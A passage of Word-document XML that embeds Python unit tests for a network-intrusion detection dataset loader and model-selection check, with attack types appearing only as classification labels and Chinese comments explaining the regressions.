          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = pd.read_csv(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB15DDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dup = df.iloc[[0]].copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D832CBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dup["feat_0"] = 999.0  # 造一行"独一无二"的，便于定位</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EDA411">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dup["Label"] = "PortScan"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01665AB4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pd.concat([df, dup, dup], ignore_index=True).to_csv(path, index=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E8A217D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2074F738">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, _, _ = load_dataset(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F45CC6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X.shape[0] == 6 * 10 + 1  # 重复的两行被合并成一行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29117C35">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(y) == {"BENIGN", "PortScan", "DDoS", "DoS Hulk", "Patator", "Heartbleed"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51974EE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="563756DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18DBEEE0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_unknown_labels_are_dropped(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42058E88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = make_csv(tmp_path / "sample.csv", n_per_class=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E5C8B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = pd.read_csv(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E39FFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    extra = df.iloc[[0]].copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6817BC2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    extra["feat_0"] = -777.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A4E891">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    extra["Label"] = "Bot"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ABF44A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pd.concat([df, extra], ignore_index=True).to_csv(path, index=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D1082E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AAD89D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, _, _ = load_dataset(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD2FFBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X.shape[0] == 6 * 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D22E64">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "Bot" not in set(y)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B6EE6B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41572F38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EC4EBCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_inf_and_nan_rows_are_dropped(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACA7B7A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = make_csv(tmp_path / "sample.csv", n_per_class=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2478460A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = pd.read_csv(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A7B08C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df.loc[0, "feat_1"] = np.inf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="797685B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df.loc[1, "feat_2"] = np.nan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42915BA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df.to_csv(path, index=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2526FAD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CCB1895">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, _, _ = load_dataset(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B97C266">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X.shape[0] == 6 * 10 - 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5703A4F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1147D599">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D90B4E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_metadata_columns_are_not_used_as_features(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB892D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：抽样脚本写的 __source__ 若被当成特征，跨天划分就等于把答案喂给模型。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACC2813">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = make_csv(tmp_path / "with_meta.csv", n_per_class=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7433DF18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df = pd.read_csv(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FB7638">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df["__source__"] = "Monday-WorkingHours.pcap_ISCX.csv"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A914B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    df.to_csv(path, index=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44670DD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66912416">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, names, _ = load_dataset(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E685CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "__source__" not in names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0809938F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert names == [f"feat_{j}" for j in range(N_FEATURES)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BD48A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X.shape == (6 * 10, N_FEATURES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C95B8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40C091EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14CB8602">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_saturation_note_fires_when_top_two_are_tied():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265AA5AB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：告警只看前两名差值。第一版用全体极差判断，逻辑回归掉队把极差撑大，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0620F8DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    告警永远不触发 —— 判据空转比没有判据更糟。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13ADB7B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from models.train import saturation_note</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47BDAF84">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="654F774D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tied = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121468BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "xgboost": {"selection_score": 0.9992},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F7DCB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "decision_tree": {"selection_score": 0.9991},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01BE535A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "logistic": {"selection_score": 0.9557},  # 掉队者不该影响判断</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B72154B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C8E9AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert saturation_note(tied) is not None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E06B8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="720E5113">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    separated = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B625AD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "xgboost": {"selection_score": 0.9992},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2048D98B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
